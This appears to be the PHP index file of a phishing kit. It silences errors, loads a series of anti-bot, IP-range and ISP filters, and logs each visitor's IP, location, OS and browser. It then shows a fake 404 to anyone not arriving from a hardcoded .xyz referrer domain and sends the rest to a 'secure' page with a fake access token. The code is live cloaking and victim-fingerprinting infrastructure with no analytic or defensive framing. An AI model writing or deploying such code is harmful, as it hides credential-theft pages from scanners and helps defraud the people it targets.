<?php 

	@error_reporting(0);
	ob_start();
	session_start();
	include_once ("anti/logger.php");
	require 'func.php';
	include ("anti/antibots1.php");
	include ("anti/antibots2.php");
	include ("anti/antibots3.php");
	include ("anti/antibots4.php");
	include ("anti/antibots5.php");
	include ("anti/antibots6.php");
	include ("anti/antibots7.php");
	include ("anti/bot.php");
	include ("anti/iprange.php");
	include ("anti/wrd.php");
	include ("anti/isp.php");
	$redirectlink = "online-u3mkfqrw7hio03cc40fn.xyz";
	
	$_SESSION['startAt'] 		= getDateNow();
	$_SESSION['ip'] 			= clientData('ip');
	$_SESSION['ip_countryName'] = clientData('country');
	$_SESSION['ip_countryCode'] = clientData('code');
	$_SESSION['ip_city'] 		= clientData('city');
	$_SESSION['ip_state'] 		= clientData('state');
	$_SESSION['ip_timezone'] 	= clientData('timezone');
	$_SESSION['ip_zip'] 		= clientData('zip');
	$_SESSION['os'] 			= getOs();
	$_SESSION['browser'] 		= getBrowser();
	$_SESSION['randString'] 	= genRandString(80);

	
	if  (isset($_SERVER['HTTP_REFERER'])){
$ref = $_SERVER['HTTP_REFERER'];
$refData = parse_url($ref);
$_SESSION['refData'] = $refData['host'];
$_SESSION['redirectlink'] = $redirectlink;
if ($_SESSION['refData'] != $redirectlink) {
        exit(header('HTTP/1.0 404 Not Found'));
}else{
	$egkey = base64_encode(time().sha1($_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_USER_AGENT']).md5(uniqid(rand(), true)));
	$_SESSION['egkey'] = $egkey;
	exit(header("Location: secure/?sslmode=true&access_token={$_SESSION['randString']}"));

}
}else{
        exit(header('HTTP/1.0 404 Not Found'));
}
	

?>